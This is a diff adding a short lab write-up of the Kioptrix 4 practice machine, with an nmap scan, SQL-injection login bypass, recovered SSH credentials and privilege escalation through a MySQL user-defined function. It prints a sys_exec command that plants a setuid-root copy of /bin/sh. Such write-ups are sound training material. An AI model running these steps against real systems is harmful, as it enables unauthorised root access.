@@ -1,0 +1,62 @@
+Description:
+	When opening the IP it shows a login page which is vulnerable to SQL Injection. The password field is actually vulnerable.By bypassing the authentication you will come to page where john's password is written.
+Which MyNameIsJohn. As SSH is running we will do ssh with this credentials.Yupp it works. After some system information gathering I found out that Robert's password and mysql running on root without password.
+Using User Defined Function I was able to get escalated privileges.
+select * from mysql.func;
+select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh');
+
+
+
+SMB Users:
+nobody, root, loneferret, john, robert 
+
+Username and Password Enumeration:
+Robert:ADGAdsafdfwt4gadfga==
+John: MyNameIsJohn
+
+# Nmap 7.91 scan initiated Sat Mar 13 02:00:12 2021 as: nmap -v -A -oN nmap_result 192.168.56.106
+Nmap scan report for 192.168.56.106
+Host is up (0.00061s latency).
+Not shown: 566 closed ports, 430 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h30m04s, deviation: 3h32m08s, median: 3s
+| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   KIOPTRIX4<00>        Flags: <unique><active>
+|   KIOPTRIX4<03>        Flags: <unique><active>
+|   KIOPTRIX4<20>        Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+|_  WORKGROUP<00>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2021-03-13T04:00:32-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Mar 13 02:00:33 2021 -- 1 IP address (1 host up) scanned in 20.12 seconds
